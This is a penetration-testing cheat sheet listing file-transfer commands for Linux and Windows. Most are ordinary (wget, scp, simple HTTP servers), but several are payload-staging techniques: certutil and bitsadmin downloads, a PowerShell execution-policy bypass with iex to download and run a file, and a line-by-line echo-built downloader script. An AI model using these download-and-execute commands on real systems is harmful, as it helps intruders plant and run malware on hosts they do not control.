# File Transfer

| Command | Description |
|---------|---------|
| `wget http://$IP/file -O /tmp/test.tmp` | Download a file with `wget` to `/tmp/test.tmp`. |
| `curl http://$IP/file` | Download a file with `curl`. |
| `fetch http://$IP/file` | Fetch a file using `fetch`. |
| `nc $IP $port > outfile` | Transfer data via Netcat to a file. |
| `nc -lnvp $port < infile` | Listen with Netcat on a port, sending data from a file. |
| `ftp -s:input.txt` | FTP command using a script. |
| `ftp $ip` | FTP connection to an IP. |
| `get $filename` | Get a file from the FTP server. |
| `sudo apt install python-pyftpdlib` | Install Python FTP library. |
| `sudo python -m pyftpdlib -p 21` | Run an FTP server on port 21. |
| `python -m SimpleHTTPServer 80` | Start a simple HTTP server (Python 2.x). |
| `python -m http.server 80` | Start a simple HTTP server (Python 3.x). |
| `curl -O http://$ip/putty.exe` | Download `putty.exe` with `curl`. |
| `python smbserver.py ata /root/share` | Start SMB server with `/root/share`. |
| `[WIN+R] \\$ip` | Access SMB share from Windows Run. |
| `apt install smbclient` | Install `smbclient` for SMB operations. |
| `smbclient -L $ip` | List SMB shares on the remote machine. |
| `smbclient //$ip/ata` | Access SMB share `ata`. |
| `(new-object System.Net.WebClient).DownloadFile('//$ip/putty.exe', 'd:\\data\\putty.exe')` | Download file via SMB using PowerShell. |
| `bitsadmin /transfer job //example.com/path/putty.exe F:\\putty.exe` | Download file via BITS. |
| `php -S 0.0.0.0:80` | Start PHP server on port 80. |
| `scp $filename user@host:~/path_dir` | Copy file via SCP to remote server. |
| `scp $filename $username@$ip:~/` | Copy file via SCP to remote server. |
| `python -m pyftpdlib 21` | Run FTP server on port 21 (attacker machine). |
| `ftp $ip` | FTP connection to an IP. |
| `bitsadmin /transfer download /priority normal http://$ip/file C:\\output\\path` | BITS download on Windows. |
| `powershell.exe -exec bypass -Command “& {iex((New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/$filename','C:\\Users\\user\\AppData\\Local\\ack.exe'));}”` | Execute a download and run via PowerShell. |
| `certutil -urlcache -split -f “http://$ip/$filename" $filename` | Download file using `certutil`. |
| `echo $storageDir = $pwd > wget.ps1` | Set storage directory in PowerShell script. |
| `echo $webclient = New-Object System.Net.WebClient >> wget.ps1` | Initialize WebClient in PowerShell script. |
| `echo $url = "http://$ip/$filename" >> wget.ps1` | Set URL for download in PowerShell. |
| `echo $filename = "filename" >> wget.ps1` | Define filename in PowerShell. |
| `echo $webclient.DownloadFile($url,$filename) >> wget.ps1` | Download file in PowerShell. |
| `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File $filename` | Execute PowerShell script to download. |
